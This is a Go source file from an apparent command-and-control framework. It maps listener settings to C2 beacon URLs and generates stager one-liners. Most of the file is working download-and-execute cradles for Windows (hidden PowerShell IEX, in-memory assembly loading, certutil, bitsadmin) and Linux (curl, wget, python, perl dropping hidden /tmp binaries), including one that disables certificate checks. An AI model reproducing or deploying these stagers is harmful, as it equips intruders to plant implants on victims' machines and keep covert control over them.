package server

import (
	"fmt"
	"log/slog"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/forgec2/forgec2/internal/obfuscation"
)

// resolvedListener holds the result of resolving a listener to C2 connection parameters.
type resolvedListener struct {
	C2URL           string
	Protocol        string
	BeaconTransport string
	DNSDomain       string
	DNSServer       string
}

// resolveListener looks up a listener by ID and returns the C2 connection parameters.
// For HTTP/HTTPS: C2URL = "scheme://host:port", Protocol = "http"
// For TCP/TLS:    C2URL = "scheme://host:port", Protocol = "tcp"
// For DNS:        C2URL = "dns://host", Protocol = "dns", DNSDomain/DNSServer set
// For gRPC/SSH/WSS/ICMP: Protocol matches transport
func (s *Server) resolveListener(listenerID uint) (*resolvedListener, error) {
	var listener db.Listener
	if err := s.db.First(&listener, listenerID).Error; err != nil || !listener.Enabled {
		return nil, fmt.Errorf("listener not found or disabled")
	}

	sch := listener.Scheme
	if sch == "" {
		sch = listener.Protocol
	}
	if sch == "" {
		sch = listener.Type
	}
	if sch == "" {
		sch = "http"
		if listener.Type == "tcp" {
			sch = "tcp"
		}
	}

	r := &resolvedListener{}

	switch sch {
	case "tcp", "tls":
		r.C2URL = fmt.Sprintf("%s://%s:%d", sch, listener.Host, listener.Port)
		r.Protocol = "tcp"
		r.BeaconTransport = "tcp"
	case "dns":
		r.C2URL = fmt.Sprintf("dns://%s", listener.Host)
		r.Protocol = "dns"
		r.BeaconTransport = "dns"
		r.DNSDomain = listener.Host
		r.DNSServer = listener.Host
	case "grpc", "grpcs":
		r.C2URL = fmt.Sprintf("%s://%s:%d", sch, listener.Host, listener.Port)
		r.Protocol = listener.Type
		r.BeaconTransport = "grpc"
	case "ssh":
		r.C2URL = fmt.Sprintf("ssh://%s:%d", listener.Host, listener.Port)
		r.Protocol = "ssh"
		r.BeaconTransport = "ssh"
	case "wss", "ws":
		r.C2URL = fmt.Sprintf("%s://%s:%d", sch, listener.Host, listener.Port)
		r.Protocol = listener.Type
		r.BeaconTransport = "wss"
	case "icmp":
		r.C2URL = fmt.Sprintf("icmp://%s", listener.Host)
		r.Protocol = "icmp"
		r.BeaconTransport = "icmp"
	case "mtls":
		r.C2URL = fmt.Sprintf("mtls://%s:%d", listener.Host, listener.Port)
		r.Protocol = listener.Type
		r.BeaconTransport = "mtls"
	case "h2c":
		r.C2URL = fmt.Sprintf("h2c://%s:%d", listener.Host, listener.Port)
		r.Protocol = "http"
		r.BeaconTransport = "h2c"
	default:
		r.C2URL = fmt.Sprintf("%s://%s:%d", sch, listener.Host, listener.Port)
		r.Protocol = "http"
		r.BeaconTransport = "http"
	}

	return r, nil
}

// Listener cache (optimization)
var (
	listenerCache     []db.Listener
	listenerCacheTime time.Time
	listenerCacheMu   sync.RWMutex
	listenerCacheTTL  = 30 * time.Second
)

func (s *Server) getListeners() []db.Listener {
	listenerCacheMu.RLock()
	if time.Since(listenerCacheTime) < listenerCacheTTL {
		result := listenerCache
		listenerCacheMu.RUnlock()
		return result
	}
	listenerCacheMu.RUnlock()

	listenerCacheMu.Lock()
	defer listenerCacheMu.Unlock()

	// Double-check after acquiring write lock
	if time.Since(listenerCacheTime) < listenerCacheTTL {
		return listenerCache
	}

	if err := s.db.Select("id", "name", "host", "port", "scheme", "type", "protocol").
		Where("enabled = ?", true).Limit(500).Find(&listenerCache).Error; err != nil {
		slog.Error("Failed to load listener cache for payload gen", "err", err)
	}
	listenerCacheTime = time.Now()
	return listenerCache
}

func (s *Server) implantDataDir() string {
	if s.cfg.Server.DataDir != "" {
		return s.cfg.Server.DataDir
	}
	return "data"
}

// cleanupOldPayloads removes hosted payloads older than 1 hour
func (s *Server) cleanupOldPayloads() {
	payloadsDir := filepath.Join(s.cfg.Server.DataDir, "payloads")
	entries, err := os.ReadDir(payloadsDir)
	if err != nil {
		return
	}
	cutoff := time.Now().Add(-GhostAgentCutoff)
	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		subDir := filepath.Join(payloadsDir, e.Name())
		info, err := e.Info()
		if err != nil {
			continue
		}
		if info.ModTime().Before(cutoff) {
			os.RemoveAll(subDir)
			slog.Debug("Cleaned up old payload", "dir", subDir)
		}
	}
}

// oneLinerItem represents a single one-liner variant returned to the UI
type oneLinerItem struct {
	Name    string `json:"name"`
	Command string `json:"command"`
	Desc    string `json:"desc"`
}

// buildOneLiners generates all one-liner variants based on payload type
func buildOneLiners(payloadType, ps1Code, payloadURL, hostPath, proxy string) []oneLinerItem {
	var items []oneLinerItem

	switch payloadType {
	case "exe":
		items = append(items, oneLinerItem{
			Name: "PowerShell Download + Exec",
			Desc: "Download EXE to temp dir and execute",
			Command: fmt.Sprintf(
				`powershell -nop -w hidden -c "$p='$env:TEMP\\svc.exe';[Net.WebClient]::new().DownloadFile('%s',$p);Start-Process $p"`,
				payloadURL),
		})
		items = append(items, oneLinerItem{
			Name: "PowerShell Memory Load (.NET)",
			Desc: "Load .NET EXE directly from memory (no disk write)",
			Command: fmt.Sprintf(
				`powershell -nop -w hidden -c "[Reflection.Assembly]::Load([Net.WebClient]::new().DownloadData('%s')).EntryPoint.Invoke($null,$null)"`,
				payloadURL),
		})
		items = append(items, oneLinerItem{
			Name: "certutil",
			Desc: "Download via certutil and execute",
			Command: fmt.Sprintf(
				`certutil -urlcache -split -f %s %%TEMP%%\\svc.exe & start /b %%TEMP%%\\svc.exe`,
				payloadURL),
		})
		items = append(items, oneLinerItem{
			Name: "BITSAdmin",
			Desc: "Background download via BITSAdmin and execute",
			Command: fmt.Sprintf(
				`bitsadmin /transfer forgec2 /download /priority high %s %%TEMP%%\\svc.exe & start /b %%TEMP%%\\svc.exe`,
				payloadURL),
		})
		items = append(items, oneLinerItem{
			Name: "curl.exe + start",
			Desc: "Download via curl and execute (Win10+ built-in)",
			Command: fmt.Sprintf(
				`curl -sL %s -o %%TEMP%%\\svc.exe & start /b %%TEMP%%\\svc.exe`,
				payloadURL),
		})
		items = append(items, oneLinerItem{
			Name: "PowerShell WebClient + IEX (Obfuscated)",
			Desc: "Obfuscated PowerShell remote download and execute",
			Command: fmt.Sprintf(
				`powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('%s')"`,
				payloadURL),
		})

	case "ps1":
		// URL-based download cradle
		items = append(items, oneLinerItem{
			Name: "IEX DownloadString",
			Desc: "Remote download PS1 script and execute via IEX",
			Command: fmt.Sprintf(
				`powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('%s')"`,
				payloadURL),
		})
		items = append(items, oneLinerItem{
			Name: "IEX DownloadString + SSL",
			Desc: "Remote download and execute ignoring cert errors",
			Command: fmt.Sprintf(
				`powershell -nop -w hidden -c "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};IEX(New-Object Net.WebClient).DownloadString('%s')"`,
				payloadURL),
		})
		items = append(items, oneLinerItem{
			Name:    "PowerShell Base64 (Self-Contained)",
			Desc:    "Built-in Base64 encoded PS1 script, no download needed",
			Command: obfuscation.GenerateCommandLineOneLiner(ps1Code),
		})
		items = append(items, oneLinerItem{
			Name: "IEX DownloadString + Proxy",
			Desc: "Download and execute via HTTP proxy",
			Command: fmt.Sprintf(
				`powershell -nop -w hidden -c "$wc=New-Object Net.WebClient;$wc.Proxy=New-Object Net.WebProxy('%s');IEX($wc.DownloadString('%s'))"`,
				strings.ReplaceAll(proxy, "'", "''"), payloadURL),
		})

	case "linux":
		items = append(items, oneLinerItem{
			Name: "curl download + exec",
			Desc: "Download ELF to /tmp and execute (background)",
			Command: fmt.Sprintf(
				`curl -sL %s -o /tmp/.u && chmod +x /tmp/.u && nohup /tmp/.u &`,
				payloadURL),
		})
		items = append(items, oneLinerItem{
			Name: "wget download + exec",
			Desc: "Download ELF via wget and execute",
			Command: fmt.Sprintf(
				`wget -q %s -O /tmp/.u && chmod +x /tmp/.u && nohup /tmp/.u &`,
				payloadURL),
		})
		items = append(items, oneLinerItem{
			Name: "python3 download + exec",
			Desc: "Download via Python3 urllib and execute",
			Command: fmt.Sprintf(
				`python3 -c "import urllib.request,os;f='/tmp/.u';urllib.request.urlretrieve('%s',f);os.chmod(f,0o755);os.system(f+' &')"`,
				payloadURL),
		})
		items = append(items, oneLinerItem{
			Name: "python2 download + exec",
			Desc: "Download via Python2 urllib and execute",
			Command: fmt.Sprintf(
				`python -c "import urllib,os;f='/tmp/.u';urllib.urlretrieve('%s',f);os.chmod(f,0o755);os.system(f+' &')"`,
				payloadURL),
		})
		items = append(items, oneLinerItem{
			Name: "perl download + exec",
			Desc: "Download via Perl and execute",
			Command: fmt.Sprintf(
				`perl -e "use LWP::Simple;getstore('%s','/tmp/.u');chmod 0755,'/tmp/.u';system('/tmp/.u &')"`,
				payloadURL),
		})
	}

	return items
}
